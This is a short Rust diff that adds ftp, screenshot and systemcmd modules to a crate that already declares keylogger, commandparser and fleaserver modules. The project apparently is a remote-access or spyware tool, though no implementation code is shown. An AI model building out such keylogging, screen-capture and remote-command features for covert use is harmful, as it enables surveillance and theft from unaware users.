@@ -2,5 +2,8 @@ pub mod fleaserver;
 pub mod commandparser;
 pub mod commandprocessor;
 pub mod keylogger;
+pub mod ftp;
+pub mod screenshot;
+pub mod systemcmd;
 #[cfg(target_os = "windows")]
 pub mod windowsfunctions;
